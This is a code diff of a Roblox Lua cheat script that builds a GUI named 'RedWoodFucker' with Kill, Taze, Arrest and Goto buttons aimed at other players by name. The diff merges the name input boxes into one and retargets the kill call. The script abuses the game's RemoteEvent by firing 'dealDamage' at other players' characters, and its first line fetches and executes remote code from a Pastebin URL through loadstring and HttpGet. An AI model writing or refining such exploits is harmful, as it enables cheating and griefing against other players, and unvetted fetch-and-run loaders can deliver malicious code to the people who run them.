@@ -1,5 +1,6 @@
 loadstring(game:HttpGet(('https://pastebin.com/raw/6mQJTqzz',true))()
 
+
 local RedWoodFucker = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local Bar = Instance.new("Frame")
@@ -22,11 +23,8 @@ local SecondTab = Instance.new("Frame")
 local Taze = Instance.new("TextButton")
 local Kill = Instance.new("TextButton")
 local Arrest = Instance.new("TextButton")
-local TazeText = Instance.new("TextBox")
-local KillText = Instance.new("TextBox")
-local ArrestText = Instance.new("TextBox")
+local NameText = Instance.new("TextBox")
 local Goto = Instance.new("TextButton")
-local GotoText = Instance.new("TextBox")
 local Back = Instance.new("TextButton")
 --Properties:
 RedWoodFucker.Name = "RedWoodFucker"
@@ -255,38 +253,16 @@ Arrest.Text = "Arrest "
 Arrest.TextColor3 = Color3.new(1, 1, 1)
 Arrest.TextSize = 14
 
-TazeText.Name = "TazeText"
-TazeText.Parent = SecondTab
-TazeText.BackgroundColor3 = Color3.new(1, 1, 1)
-TazeText.BorderSizePixel = 2
-TazeText.Position = UDim2.new(0.525477707, 0, 0.105527602, 0)
-TazeText.Size = UDim2.new(0, 72, 0, 18)
-TazeText.Font = Enum.Font.SourceSans
-TazeText.Text = ""
-TazeText.TextColor3 = Color3.new(0, 0, 0)
-TazeText.TextSize = 14
-
-KillText.Name = "KillText"
-KillText.Parent = SecondTab
-KillText.BackgroundColor3 = Color3.new(1, 1, 1)
-KillText.BorderSizePixel = 2
-KillText.Position = UDim2.new(0.525477707, 0, 0.296482384, 0)
-KillText.Size = UDim2.new(0, 72, 0, 18)
-KillText.Font = Enum.Font.SourceSans
-KillText.Text = ""
-KillText.TextColor3 = Color3.new(0, 0, 0)
-KillText.TextSize = 14
-
-ArrestText.Name = "ArrestText"
-ArrestText.Parent = SecondTab
-ArrestText.BackgroundColor3 = Color3.new(1, 1, 1)
-ArrestText.BorderSizePixel = 2
-ArrestText.Position = UDim2.new(0.525477707, 0, 0.48241204, 0)
-ArrestText.Size = UDim2.new(0, 72, 0, 18)
-ArrestText.Font = Enum.Font.SourceSans
-ArrestText.Text = ""
-ArrestText.TextColor3 = Color3.new(0, 0, 0)
-ArrestText.TextSize = 14
+NameText.Name = "NameText"
+NameText.Parent = SecondTab
+NameText.BackgroundColor3 = Color3.new(1, 1, 1)
+NameText.BorderSizePixel = 2
+NameText.Position = UDim2.new(0.595541418, 0, 0.37410304, 0)
+NameText.Size = UDim2.new(0, 102, 0, 26)
+NameText.Font = Enum.Font.SourceSans
+NameText.Text = ""
+NameText.TextColor3 = Color3.new(0, 0, 0)
+NameText.TextSize = 14
 
 Goto.Name = "Goto"
 Goto.Parent = SecondTab
@@ -298,17 +274,6 @@ Goto.Font = Enum.Font.SourceSans
 Goto.Text = "Goto"
 Goto.TextColor3 = Color3.new(1, 1, 1)
 Goto.TextSize = 14
-
-GotoText.Name = "GotoText"
-GotoText.Parent = SecondTab
-GotoText.BackgroundColor3 = Color3.new(1, 1, 1)
-GotoText.BorderSizePixel = 2
-GotoText.Position = UDim2.new(0.525477707, 0, 0.678391933, 0)
-GotoText.Size = UDim2.new(0, 72, 0, 18)
-GotoText.Font = Enum.Font.SourceSans
-GotoText.Text = ""
-GotoText.TextColor3 = Color3.new(0, 0, 0)
-GotoText.TextSize = 14
 
 Back.Name = "Back"
 Back.Parent = MainFrame
@@ -408,8 +373,8 @@ Back.MouseButton1Click : Connect (function()
 end)
 Arrest.MouseButton1Click : Connect (function()
 
-    if (ArrestText.Text ~= "")
-    then    local b = ArrestText.Text
+    if (NameText.Text ~= "")
+    then    local b = NameText.Text
     for c,d in
     pairs(game:GetService("Players"):GetPlayers())do if
     b:lower()==d.Name:sub(1,b:len()):lower()
@@ -422,13 +387,13 @@ Arrest.MouseButton1Click : Connect (function()
     
 end)
 Kill.MouseButton1Click : Connect(function()
-    if (KillText.Text ~= "")
-    then    local b = KillText.Text
+    if (NameText.Text ~= "")
+    then    local b = NameText.Text
     for c,d in
     pairs(game:GetService("Players"):GetPlayers())do if
     b:lower()==d.Name:sub(1,b:len()):lower()
     then
-    game:GetService("Workspace").resources.RemoteEvent:FireServer("dealDamage",d,100)
+    game:GetService("Workspace").resources.RemoteEvent:FireServer("dealDamage",d.Character.Humanoid,100)
     end
     end
     end
@@ -437,8 +402,8 @@ Kill.MouseButton1Click : Connect(function()
     
 end)
 Taze.MouseButton1Click : Connect (function()
-    if (TazeText.Text ~= "")
-    then    local b = TazeText.Text
+    if (NameText.Text ~= "")
+    then    local b = NameText.Text
     for c,d in
     pairs(game:GetService("Players"):GetPlayers())do if
     b:lower()==d.Name:sub(1,b:len()):lower()
@@ -452,8 +417,8 @@ Taze.MouseButton1Click : Connect (function()
     
 end)
 Goto.MouseButton1Click : Connect (function()
-    if (GotoText.Text ~= "")
-    then    local b = GotoText.Text
+    if (NameText.Text ~= "")
+    then    local b = NameText.Text
     for c,d in
     pairs(game:GetService("Players"):GetPlayers())do if
     b:lower()==d.Name:sub(1,b:len()):lower()
